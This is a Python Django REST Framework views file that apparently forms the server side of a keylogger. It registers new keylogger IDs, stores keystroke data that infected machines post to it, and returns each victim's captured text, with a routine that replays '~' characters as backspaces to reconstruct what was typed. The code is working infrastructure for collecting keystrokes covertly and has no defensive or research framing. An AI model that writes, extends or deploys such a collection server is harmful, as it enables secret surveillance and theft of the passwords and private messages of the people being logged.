from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework import status
from rest_framework.renderers import JSONRenderer

from django.shortcuts import render, redirect
from django.views import View
from django.http import HttpResponse
from django.db import transaction

from .models import *
from .serializers import *


class GetAllData(APIView):
    def get(self, request, format=None):
        serializer = GetDataSerializer(KeyloggerData.objects.all(), many=True)
        return Response(serializer.data)

    @transaction.atomic
    def post(self, request):
        serializer = GetDataSerializer(data = request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(status=status.HTTP_201_CREATED)
        else:
            return Response(status=status.HTTP_400_BAD_REQUEST)
        

class CreateId(APIView):
    @transaction.atomic
    def get(self, request):
        new = KeyloggerID()
        new.save()
        serializer = GetIDSerializer(new)
        return Response(serializer.data)

class GetDataById(APIView):
    def get(self, request, pk):
        data = KeyloggerData.objects.filter(keylogger_ref = pk)
        if data:
            serializer = GetDataSerializer(data, many=True)
            return Response(serializer.data)
        else:
            return Response(status=status.HTTP_404_NOT_FOUND)

class GetAllTextById(APIView):
    def __create_text(self, data):
        text = ''
        for i in data:
            text += i.data
        return text

    def get(self, request, pk):
        data = KeyloggerData.objects.filter(keylogger_ref = pk)
        if data:
            text = self.__create_text(data)
            return Response({'text': text})
        else:
            return Response(status=status.HTTP_404_NOT_FOUND)

class GetParsedText(APIView):
    def __create_text(self, data):
        text = ''
        for i in data:
            text += i.data
        return text
    def parse_data(self, data):
        text = self.__create_text(data)
        parse_text = ''
        chars_to_del = 0
        for i in text[::-1]:
            if i == '~':
                chars_to_del+=1
            elif chars_to_del<=0:
                parse_text+=i
            else:
                chars_to_del-=1
        return parse_text[::-1]

    def get(self, request, pk):
        data = KeyloggerData.objects.filter(keylogger_ref = pk)
        if data:
            parsed_text = self.parse_data(data)
            return Response({'text': parsed_text})
        else:
            return Response(status=status.HTTP_404_NOT_FOUND)
